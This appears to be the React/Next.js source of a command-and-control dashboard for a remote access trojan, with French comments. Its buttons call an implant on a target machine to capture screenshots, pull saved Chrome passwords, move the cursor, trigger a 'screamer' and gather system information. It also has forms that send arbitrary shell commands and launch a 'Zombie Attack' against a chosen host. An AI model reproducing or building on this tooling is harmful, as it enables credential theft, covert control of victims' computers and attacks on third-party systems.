"use client";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";

const actions = [
  { label: "Screamer", endpoint: "/screamer", method: "GET" },
  { label: "Screenshot", endpoint: "/screenshot", method: "GET" },
  { label: "Move Cursor", endpoint: "/move-cursor", method: "GET" },
  { label: "Chrome Passwords", endpoint: "/chrome-passwords", method: "GET" },
  { label: "Notify", endpoint: "/notify", method: "POST", body: { message: "Notification depuis le dashboard" } },
  { label: "System Info", endpoint: "/system-info", method: "GET" },
  { label: "OS", endpoint: "/os", method: "GET" },
  { label: "IP", endpoint: "/ip", method: "GET" },
  { label: "Status", endpoint: "/status", method: "GET" },
];

export default function MonitorPage() {
  const [ip, setIp] = useState("");
  const [port, setPort] = useState("");
  const [result, setResult] = useState("");
  const router = useRouter();

  useEffect(() => {
    const storedIp = localStorage.getItem("dashboard_ip");
    const storedPort = localStorage.getItem("dashboard_port");
    if (!storedIp || !storedPort) {
      router.push("/");
    } else {
      setIp(storedIp);
      setPort(storedPort);
    }
  }, [router]);

  const callAction = async (action) => {
    if (!ip || !port) return;
    setResult("Chargement...");
    try {
      const url = `http://${ip}:${port}${action.endpoint}`;
      const options = { method: action.method };
      if (action.method === "POST" && action.body) {
        options.headers = { "Content-Type": "application/json" };
        options.body = JSON.stringify(action.body);
      }
      const res = await fetch(url, options);
      if (action.endpoint === "/screenshot") {
        // Afficher un bouton pour ouvrir l'image dans un nouvel onglet
        const blob = await res.blob();
        const imgUrl = URL.createObjectURL(blob);
        setResult(
          <a href={imgUrl} target="_blank" rel="noopener noreferrer">
            <button style={{ fontSize: 18, padding: "16px 32px", margin: "32px auto 0 auto", display: "block", borderRadius: 8, background: "#00bfff", color: "#181818", border: "none", cursor: "pointer" }}>
              Click to see screenshot
            </button>
          </a>
        );
      } else {
        let text = await res.text();
        // Essayons de parser le JSON pour un affichage propre
        try {
          const obj = JSON.parse(text);
          text = <pre style={{ color: "#00bfff", fontSize: 16, whiteSpace: "pre-wrap", wordBreak: "break-all", margin: 0 }}>{JSON.stringify(obj, null, 2)}</pre>;
        } catch {
          // Nettoyage simple des {""} éventuels
          text = text.replace(/^{"|"}$/g, "").replace(/\\"/g, '"');
        }
        setResult(text);
      }
    } catch (e) {
      setResult("Erreur: " + e.message);
    }
  };

  // Pour shell et zombie, on ajoute un formulaire simple :
  const [shellCmd, setShellCmd] = useState("");
  const [zombieHost, setZombieHost] = useState("");
  const [zombieQty, setZombieQty] = useState(1);

  const callShell = async (e) => {
    e.preventDefault();
    if (!ip || !port || !shellCmd) return;
    setResult("Chargement...");
    try {
      const url = `http://${ip}:${port}/shell`;
      const res = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ command: shellCmd })
      });
      const text = await res.text();
      setResult(text);
    } catch (e) {
      setResult("Erreur: " + e.message);
    }
  };

  const callZombie = async (e) => {
    e.preventDefault();
    if (!ip || !port || !zombieHost) return;
    setResult("Chargement...");
    try {
      const url = `http://${ip}:${port}/zombie`;
      const res = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ host: zombieHost, quantity: zombieQty })
      });
      const text = await res.text();
      setResult(text);
    } catch (e) {
      setResult("Erreur: " + e.message);
    }
  };

  if (!ip || !port) return null;

  return (
    <div style={{ padding: 32, maxWidth: 1300, margin: "0 auto", display: "flex", gap: 32, alignItems: "flex-start" }}>
      {/* Colonne Commandes */}
      <div style={{ flex: 1, minWidth: 340 }}>
        <h1 style={{ textAlign: "center", marginBottom: 32 }}>Monitor Dashboard</h1>
        <div style={{
          display: "grid",
          gridTemplateColumns: "repeat(auto-fit, minmax(220px, 1fr))",
          gap: 24,
          marginBottom: 40
        }}>
          {actions.map(action => (
            <div key={action.label} style={{ display: "flex", flexDirection: "column", alignItems: "center", background: "#222", borderRadius: 10, padding: 24, boxShadow: "0 2px 12px #0004" }}>
              <button
                onClick={() => callAction(action)}
                style={{ width: "100%", fontSize: 18, padding: "18px 0", marginBottom: 8 }}
              >{action.label}</button>
            </div>
          ))}
        </div>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 32, marginBottom: 40 }}>
          <div style={{ background: "#222", borderRadius: 10, padding: 24, boxShadow: "0 2px 12px #0004" }}>
            <h2 style={{ marginTop: 0, marginBottom: 16 }}>Shell Command</h2>
            <form onSubmit={callShell} style={{ display: "flex", flexDirection: "column", gap: 16 }}>
              <input type="text" value={shellCmd} onChange={e => setShellCmd(e.target.value)} placeholder="ls -la" style={{ width: "100%" }} />
              <button type="submit" style={{ width: "100%", fontSize: 18, padding: "16px 0" }}>Envoyer</button>
            </form>
          </div>
          <div style={{ background: "#222", borderRadius: 10, padding: 24, boxShadow: "0 2px 12px #0004" }}>
            <h2 style={{ marginTop: 0, marginBottom: 16 }}>Zombie Attack</h2>
            <form onSubmit={callZombie} style={{ display: "flex", flexDirection: "column", gap: 16 }}>
              <input type="text" value={zombieHost} onChange={e => setZombieHost(e.target.value)} placeholder="Zombie Host" style={{ width: "100%" }} />
              <input type="number" value={zombieQty} min={1} onChange={e => setZombieQty(Number(e.target.value))} placeholder="Quantity" style={{ width: "100%" }} />
              <button type="submit" style={{ width: "100%", fontSize: 18, padding: "16px 0" }}>Lancer Zombie</button>
            </form>
          </div>
        </div>
      </div>
      {/* Colonne Résultat */}
      <div style={{ flex: 1, minWidth: 340, maxWidth: 600 }}>
        <div style={{ background: "#23272e", borderRadius: 10, padding: 24, minHeight: 120, boxShadow: "0 2px 12px #0004", position: "sticky", top: 32 }}>
          <h2 style={{ marginTop: 0 }}>Résultat</h2>
          <div style={{ wordBreak: "break-all", marginTop: 12 }}>{result}</div>
        </div>
      </div>
    </div>
  );
} 